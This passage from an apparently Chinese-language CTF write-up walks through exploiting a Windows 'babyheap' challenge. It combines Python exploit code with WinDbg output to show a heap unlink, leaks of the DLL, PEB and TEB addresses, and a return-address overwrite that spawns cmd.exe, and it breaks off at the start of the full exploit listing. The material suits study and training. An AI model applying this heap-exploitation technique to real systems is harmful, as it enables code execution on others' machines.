<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">8</span></span><br><span class="line">leak = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">1</span>,payload + i * <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    ru(payload)</span><br><span class="line">    data = ru(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="built_in">len</span>(leak):</span><br><span class="line">        leak += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        leak += data[i]</span><br><span class="line">leak = u64(leak)</span><br><span class="line">success(<span class="string">&quot;leak&quot;</span>,leak)</span><br></pre></td></tr></table></figure>

<p>调试得到 <code>chunk 1</code> 的 <code>header</code> 为 <code>0x0f00baa77755b659</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:004&gt; dc babyheap + <span class="number">0x4370</span></span><br><span class="line">002d4370  01ac0498 01ac04a8 01ac04b8 <span class="number">00000000</span>  ................</span><br><span class="line">002d4380  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d4390  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43b0  <span class="number">00000000</span> <span class="number">00000000</span> 01ac0000 <span class="number">000</span>10101  ................</span><br><span class="line">002d43c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">002d43d0  00000002 <span class="number">00000000</span> 00000024 <span class="number">00000000</span>  ........$.......</span><br><span class="line">002d43e0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:004&gt; dq 01ac04a8-<span class="number">0x8</span></span><br><span class="line">01ac04a0  0f00baa7`7755b659 01ac00c0`01ac0031</span><br><span class="line">01ac04b0  0f00baa7`7755b659 01ac00c0`01ac0032</span><br><span class="line">01ac04c0  0000baa7`1354b53f 01ac00c0`01ac00c0</span><br><span class="line">01ac04d0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">01ac04e0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">01ac04f0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">01ac0500  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">01ac0510  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>得到的结果一致</p>
<p><img src="https://s2.loli.net/2022/05/04/unzRXIpifjKyv34.png" alt="Untitled 1.png"></p>
<p>然后我们便可以进行 unlink</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;0&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;4&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;5&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;6&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;7&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">&quot;8&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0&quot;</span> * <span class="number">0x70</span></span><br><span class="line">leak = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">0</span>,payload + i * <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(payload)</span><br><span class="line">    data = ru(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="built_in">len</span>(leak):</span><br><span class="line">        leak += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        leak += data[i]</span><br><span class="line">leak = u64(leak)</span><br><span class="line">success(<span class="string">&quot;leak&quot;</span>,leak)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0&quot;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(leak)</span><br><span class="line">payload += p32(chunk_list)</span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/04/RSEw1yB9Ja86Gxi.png" alt="Untitled 2.png"></p>
<p>随后先泄露出 <code>ucrtbase.dll</code> 和 <code>kernel32.dll</code> 的基址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">exit_iat = exe_base + <span class="number">0x30AC</span></span><br><span class="line">IsDebuggerPresent_iat = exe_base + <span class="number">0x3010</span></span><br><span class="line"></span><br><span class="line">backdoor(chunk_used_list + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(exit_iat) <span class="comment"># exit</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(IsDebuggerPresent_iat) <span class="comment"># IsDebuggerPresent</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">ucrtbase_base = u32(rc(<span class="number">4</span>)) - <span class="number">0x44380</span></span><br><span class="line">success(<span class="string">&quot;ucrtbase_base&quot;</span>,ucrtbase_base)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">kernel32_base = u32(rc(<span class="number">4</span>)) - <span class="number">0x220d0</span></span><br><span class="line">success(<span class="string">&quot;kernel32_base&quot;</span>,kernel32_base)</span><br></pre></td></tr></table></figure>

<p>然后我们需要寻找栈地址进行利用，在 <code>teb</code> 中会存有栈地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:003&gt; !teb</span><br><span class="line">TEB at 00945000</span><br><span class="line">    ExceptionList:        <span class="number">0</span>10bfab4</span><br><span class="line">    StackBase:            <span class="number">0</span>10c0000</span><br><span class="line">    StackLimit:           <span class="number">0</span>10bc000</span><br><span class="line">    SubSystemTib:         <span class="number">00000000</span></span><br><span class="line">    FiberData:            <span class="number">00001e00</span></span><br><span class="line">    ArbitraryUserPointer: <span class="number">00000000</span></span><br><span class="line">    Self:                 00945000</span><br><span class="line">    EnvironmentPointer:   <span class="number">00000000</span></span><br><span class="line">    ClientId:             00001eb0 . 00002728</span><br><span class="line">    RpcHandle:            <span class="number">00000000</span></span><br><span class="line">    Tls Storage:          <span class="number">00000000</span></span><br><span class="line">    PEB Address:          00939000</span><br><span class="line">    LastErrorValue:       <span class="number">0</span></span><br><span class="line">    LastStatusValue:      <span class="number">0</span></span><br><span class="line">    Count Owned Locks:    <span class="number">0</span></span><br><span class="line">    HardErrorMode:        <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>对于 <code>Windows</code> 的程序来说，每个进程都有一个 <code>PEB</code>，每个线程都有一个 <code>TEB</code>，而且他们的相对偏移一般是固定的。那么我们只要知道 <code>PEB</code> 的地址，就可以计算出 <code>TEB</code> 的地址，从而泄露<code>StackBase</code></p>
<p>那么我们该如何泄露 <code>ntdll.dll</code> 的基地址呢，我们可以首先查看 <code>ntdll!NtCreateFile</code> 的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:003&gt; dc ntdll!NtCreateFile</span><br><span class="line">77472f20  000055b8 8870ba00 d2ff7748 90002cc2  .U....p.Hw...,..</span><br><span class="line">77472f30  000056b8 8870ba00 d2ff7748 900014c2  .V....p.Hw......</span><br><span class="line">77472f40  000057b8 8870ba00 d2ff7748 900018c2  .W....p.Hw......</span><br><span class="line">77472f50  000058b8 8870ba00 d2ff7748 90000cc2  .X....p.Hw......</span><br><span class="line">77472f60  000059b8 8870ba00 d2ff7748 900040c2  .Y....p.Hw...@..</span><br><span class="line">77472f70  18005ab8 8870ba00 d2ff7748 900004c2  .Z....p.Hw......</span><br><span class="line">77472f80  1d005bb8 8870ba00 d2ff7748 900014c2  .[....p.Hw......</span><br><span class="line">77472f90  00005cb8 8870ba00 d2ff7748 <span class="number">9000</span>10c2  .\....p.Hw......</span><br></pre></td></tr></table></figure>

<p>然后在 <code>kernel32.dll</code> 的内存区域进行搜索</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ModLoad: 771b0000 772a0000   C:\WINDOWS\System32\KERNEL32.DLL</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:003&gt; s -[<span class="number">1</span>]d 771b0000 L100000 77472f20</span><br><span class="line"><span class="number">0x77231af4</span></span><br><span class="line"><span class="number">0x77231fb4</span></span><br><span class="line"><span class="number">0x77401804</span></span><br><span class="line"><span class="number">0x77407338</span></span><br></pre></td></tr></table></figure>

<p>最后选择一个偏移进行泄露即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">NtCreateFile_iat = kernel32_base + <span class="number">0x00081fb4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(NtCreateFile_iat) <span class="comment"># NtCreateFile</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">ntdll_base = u32(rc(<span class="number">4</span>)) - <span class="number">0x72f20</span></span><br><span class="line">success(<span class="string">&quot;ntdll_base&quot;</span>,ntdll_base)</span><br></pre></td></tr></table></figure>

<p>之后我们泄露 <code>PEB</code> 的地址，我们可以从 <code>ntdll!PebLdr</code> 附近得到 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:004&gt; .process</span><br><span class="line">Implicit process <span class="keyword">is</span> now 004f8000</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:004&gt; dc ntdll!PebLdr</span><br><span class="line">77525d80  00000030 00000001 <span class="number">00000000</span> 009c6af0  <span class="number">0.</span>...........j..</span><br><span class="line">77525d90  009c3340 009c6af8 009c3348 009c6a18  @<span class="number">3.</span>..j..H3...j..</span><br><span class="line">77525da0  009c3350 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  P3..............</span><br><span class="line">77525db0  00000002 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">77525dc0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">77525dd0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">77525de0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">77525df0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:004&gt; dc 77525d00</span><br><span class="line">77525d00  77525d00 77525d00 <span class="number">00000000</span> 002d0100  .]Rw.]Rw......-.</span><br><span class="line">77525d10  <span class="number">00000000</span> <span class="number">00000000</span> 00000400 004f8154  ............T.O.</span><br><span class="line">77525d20  <span class="number">0000</span>1000 <span class="number">00000000</span> 00620026 009c6998  ........&amp;.b..i..</span><br><span class="line">77525d30  00000040 004f8044 <span class="number">629</span>107f4 <span class="number">00000000</span>  @...D.O....b....</span><br><span class="line">77525d40  <span class="number">00000000</span> 0a8c87ce <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line">77525d50  00000054 0000000c <span class="number">00000000</span> <span class="number">00000000</span>  T...............</span><br><span class="line">77525d60  <span class="number">00000000</span> <span class="number">00000000</span> 009c6a08 <span class="number">77400000</span>  .........j....@w</span><br><span class="line">77525d70  <span class="number">00000000</span> 009c0000 <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:004&gt; dc 77525d1C</span><br><span class="line">77525d1c  004f8154 <span class="number">0000</span>1000 <span class="number">00000000</span> 00620026  T.O.........&amp;.b.</span><br><span class="line">77525d2c  009c6998 00000040 004f8044 <span class="number">629</span>107f4  .i..@...D.O....b</span><br><span class="line">77525d3c  <span class="number">00000000</span> <span class="number">00000000</span> 0a8c87ce <span class="number">00000000</span>  ................</span><br><span class="line">77525d4c  <span class="number">00000000</span> 00000054 0000000c <span class="number">00000000</span>  ....T...........</span><br><span class="line">77525d5c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> 009c6a08  .............j..</span><br><span class="line">77525d6c  <span class="number">77400000</span> <span class="number">00000000</span> 009c0000 <span class="number">00000000</span>  ..@w............</span><br><span class="line">77525d7c  <span class="number">00000000</span> 00000030 00000001 <span class="number">00000000</span>  ...<span class="number">.0</span>...........</span><br><span class="line">77525d8c  009c6af0 009c3340 009c6af8 009c3348  .j..@<span class="number">3.</span>..j..H3..</span><br></pre></td></tr></table></figure>

<p>所以泄露出 <code>PEB</code> 地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ntdll_PedLdr_addr = ntdll_base + <span class="number">0x125d80</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(ntdll_PedLdr_addr - <span class="number">0x64</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">peb_addr = u32(ru(<span class="string">&quot;\r\n&quot;</span>)) - <span class="number">0x154</span></span><br><span class="line">success(<span class="string">&quot;peb_addr&quot;</span>,peb_addr)</span><br></pre></td></tr></table></figure>

<p>又因为 <code>PEB</code> 和 <code>TEB</code> 见的偏移是固定的，所以直接计算读取即可</p>
<blockquote>
<p>需要注意的是要计算的是 babyheap.exe 的 teb</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r $teb</span><br><span class="line">$teb=004c7000</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r $peb</span><br><span class="line">$peb=004c4000</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ?004c7000-004c4000</span><br><span class="line">Evaluate expression: <span class="number">12288</span> = 00003000</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">teb_addr = peb_addr + <span class="number">0x3000</span></span><br><span class="line">success(<span class="string">&quot;teb_addr&quot;</span>,teb_addr)</span><br></pre></td></tr></table></figure>

<p>然后读取栈地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(teb_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;Show : &quot;</span>)</span><br><span class="line">stack_addr = u32(ru(<span class="string">&quot;\r\n&quot;</span>).ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x154</span></span><br><span class="line">success(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br></pre></td></tr></table></figure>

<p>然后通过偏移计算 <code>ret_addr</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; k</span><br><span class="line"> <span class="comment"># ChildEBP RetAddr      </span></span><br><span class="line"><span class="number">00</span> 006ff6a0 774efce4     ntdll!RtlReportCriticalFailure+<span class="number">0x4b</span></span><br><span class="line">01 006ff6ac 774edbd9     ntdll!RtlpReportHeapFailure+<span class="number">0x2f</span></span><br><span class="line">02 006ff6dc 774f6050     ntdll!RtlpHpHeapHandleError+<span class="number">0x89</span></span><br><span class="line">03 006ff6f4 77447a6a     ntdll!RtlpLogHeapFailure+<span class="number">0x43</span></span><br><span class="line">04 006ff8ac 77446e3c     ntdll!RtlpAllocateHeap+<span class="number">0xa6a</span></span><br><span class="line">05 006ff948 77445dde     ntdll!RtlpAllocateHeapInternal+<span class="number">0x104c</span></span><br><span class="line">06 006ff960 002d1262     ntdll!RtlAllocateHeap+<span class="number">0x3e</span></span><br><span class="line">WARNING: Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</span><br><span class="line">07 006ff99c 002d193b     babyheap+<span class="number">0x1262</span></span><br><span class="line">08 006ff9e4 771cfa29     babyheap+<span class="number">0x193b</span></span><br><span class="line">09 006ff9f4 77467a9e     KERNEL32!BaseThreadInitThunk+<span class="number">0x19</span></span><br><span class="line">0a 006ffa50 77467a6e     ntdll!__RtlUserThreadStart+<span class="number">0x2f</span></span><br><span class="line">0b 006ffa60 <span class="number">00000000</span>     ntdll!_RtlUserThreadStart+<span class="number">0x1b</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc 006ff99c+<span class="number">4</span></span><br><span class="line">006ff9a0  002d193b 00000001 00990570 0099dbd8  ;.-.....p.......</span><br><span class="line">006ff9b0  b39b99c5 002d19c3 002d19c3 00596000  ......-...-..`Y.</span><br><span class="line">006ff9c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> 006ff9b0  ..............o.</span><br><span class="line">006ff9d0  <span class="number">00000000</span> 006ffa40 002d1f9b b3d95999  ....@.o...-..Y..</span><br><span class="line">006ff9e0  <span class="number">00000000</span> 006ff9f4 771cfa29 00596000  ......o.)..w.`Y.</span><br><span class="line">006ff9f0  771cfa10 006ffa50 77467a9e 00596000  ...wP.o..zFw.`Y.</span><br><span class="line">006ffa00  4849ac19 <span class="number">00000000</span> <span class="number">00000000</span> 00596000  ..IH.........`Y.</span><br><span class="line">006ffa10  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/04/isYREge9U1mPNWx.png" alt="Untitled 3.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret_addr = stack_addr + <span class="number">0x220</span></span><br><span class="line">success(<span class="string">&quot;ret_addr&quot;</span>,ret_addr)</span><br></pre></td></tr></table></figure>

<p>最后执行 <code>system(&quot;cmd.exe&quot;)</code> 即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(chunk_list + <span class="number">4</span>)</span><br><span class="line">payload += p32(ret_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">system_addr = ucrtbase_base + <span class="number">0xec730</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(ret_addr + <span class="number">0xc</span>)</span><br><span class="line">payload += <span class="string">&quot;cmd.exe\x00&quot;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>

<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 